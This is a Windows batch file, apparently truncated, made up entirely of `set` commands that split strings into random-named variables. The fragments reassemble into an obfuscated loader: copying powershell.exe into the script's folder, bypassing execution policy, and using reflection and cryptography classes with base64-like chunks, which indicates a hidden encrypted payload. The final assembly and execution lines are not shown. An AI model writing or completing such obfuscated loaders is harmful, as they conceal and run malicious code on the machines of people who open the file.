@echo off
set "UivGuklBEf=y "
set "iAxxRQSfRX=nd"
set "YtzKvyHPIh=0\"
set "GifbYZxvil=.e"
set "aTpsLIjpBB=\W"
set "zXIbAaglLi=\v"
set "ipngtzlEfm=xe"
set "yFvIHXnSFG=we"
set "MOomADLNWK=1."
set "ifxWDtjBMg=in"
set "dQvxrGnSiM=po"
set "xcxNqGvNcl=st"
set "TGjyBXvDpl=co"
set "LGdRiESAik=s\"
set "kfMkkURpKn=ll"
set "tgdNeTUZde=Po"
set "xaGxkIQZei=ow"
set "znYrlMPnHd=ws"
set "YsWHyHghOK=32"
set "sqCDeVtQVT=he"
set "EVUIMWZTsU=he"
set "GcNdHDAuWR= C"
set "daDQrrzjff= /"
set "aftBCphoKN=:\"
set "DtaScVgfLQ=rS"
set "HcknUweLAx=Wi"
set "pSEjUklpCZ=ll"
set "zPTyIAIWKM=Sy"
set "jetZpfyXFb=rs"
set "ddGxNffPpI=do"
set "OkAHxSVOFP=py"
set "GfGsMCwFpn=em"
set "QNikiwRzKH=we"
set "UEXdaOWWCr= %~dp0"
set "GkBQnKjtUy=cd"
set "xytPshpRIU=flec"
set "BmYkhVivod=16] "
set "DCUTvLbTAK=iOdg"
set "EPFHOuaCVi=.Sec"
set "jnkfLvndnH=();$"
set "nNItZUWSpW=qR);"
set "IGhKuBjnqr= [st"
set "HQCPUSSiPl=tnV."
set "tdGQvcCEgR=g = "
set "FlfsDXJuTe=;$HF"
set "BgtpiHzEiq=gN+y"
set "DpgcLScZpa= = ["
set "GhsRSnHLwM=[-1."
set "rhLOaENzNr=Syst"
set "GQUWtHvnjh=New-"
set "wEQYtzkPjf=-ep "
set "BYcltwVIHN=fore"
set "ymgSCQjJcC=mMK4"
set "DyWoJJZtOA== [S"
set "oITXJFlDcB=jIaq"
set "UFZbpUQDmh=ohGY"
set "EVeGbHaBtE=ct S"
set "EEGncIYgSH=ct S"
set "ihjpfFQEYz===')"
set "NcpoOgdirm=b6t6"
set "xpIVNLerRr=Bmor"
set "VIXWkxqTte=o.Pa"
set "fOwcwUDSRU=Secu"
set "hmrgmBRUtB=OQlA"
set "gexQVZuRAx=q.En"
set "SHYMvTCrlM=$cFA"
set "sNREQqlUgm= New"
set "USYuhFdASa=1] -"
set "bQDNURSZRa=oin "
set "lcHDKcTftr=, (,"
set "ncTRYQZkvc=($VR"
set "SscfXYGAqn=Obje"
set "KAlVHdOTyB=ode]"
set "gJnsgjNIJS=I = "
